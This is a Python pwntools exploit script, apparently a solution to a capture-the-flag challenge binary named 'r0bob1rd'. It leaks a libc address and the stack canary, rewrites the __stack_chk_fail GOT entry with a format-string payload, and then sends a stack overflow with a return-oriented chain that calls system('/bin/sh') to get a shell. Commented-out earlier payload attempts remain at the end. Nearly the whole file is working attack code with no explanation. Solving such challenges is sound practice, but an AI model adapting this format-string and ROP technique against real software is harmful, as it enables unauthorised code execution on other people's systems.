#!/usr/bin/env python3
from pwn import *

rbn = 0x6020a0
libc_start = 0x601ff0
stack_chk = 0x602028
rdi_gadget = 0x23b6a
main_base = 0x400c0f

sc_offset = 56
rb_offset = int(176 / 8) * -1
rdi_offset = int(0x400cc3 - main_base)

elf = context.binary = ELF('./r0bob1rd', checksec=False)
libc = ELF('./glibc/libc.so.6', checksec=False)
context.terminal = ['tmux', 'splitw', '-h']

p = process()
gdb.attach(p, '''b *0x0000000000400bf8
           c''')

p.recvuntil(b'Select a R0bob1rd > ')
p.sendline(b'-22')
p.recvuntil(b"You've chosen: ")

libc_base = int.from_bytes(p.recvuntil(b'\n').strip(), 'little')
rdi_gadget = libc_base + 0x23b6a
bin_sh = libc_base + 0x1b45bd
libc.address = libc_base
one_gadget = libc_base + 0xe3b04
log.info(f"libc base: {hex(libc_base)}")

p.recvuntil(b'> ')

# Phase 1
# Overwrite __stack_chk_fail with rdi gadget
payload = fmtstr_payload(9, {elf.got['__stack_chk_fail'] : elf.sym.operation}, write_size='byte', numbwritten=len(b'0xc64807a1205f000a|||'))

# , 0x400ed0 : bin_sh, elf.got['puts']: libc.sym['system']
log.info(f'Payload len: {len(payload)}')
p.sendline(b'%21$p|||' + payload + b'A' * (56 - len(b'%21$p|||')))
p.recvuntil(b'[Description]\n')
canary = bytearray(p.recvuntil(b'00'))
canary = int(bytes(canary), 16)
log.info(f'Canary: {hex(canary)}')

# Phase 2
p.recvuntil(b'Select a R0bob1rd > ')
p.sendline(b'0')
p.recvuntil(b'> ')

# payload = fmtstr_payload(8, {elf.got['puts'] : libc.sym['system']}, write_size='byte')
# log.info(f"Payload len: {len(payload)}")
p.sendline(b'A' * 104 + canary.to_bytes(8, 'little') + b'B' * 8 + p64(rdi_gadget) + p64(bin_sh) + libc.sym.system.to_bytes(8, 'little'))
p.interactive()

# p.recvuntil(b'[Description]\n')
# canary = bytearray(p.recvuntil(b' '))
# log.info(f'Canary: {canary}')
# canry = canary[:-1] + b'\x00'
# canary = int(bytes(canary), 16)
# log.info(f'Canary: {hex(canary)}')

# payload = fmtstr_payload(8, {elf.got['printf'] : elf.sym['operation']})
# log.info(f'Payload len: {len(payload)}')
# p.sendline(payload + b'A' * (105 - 48))

# p.interactive()
# res = p.recvall()
# print(res)

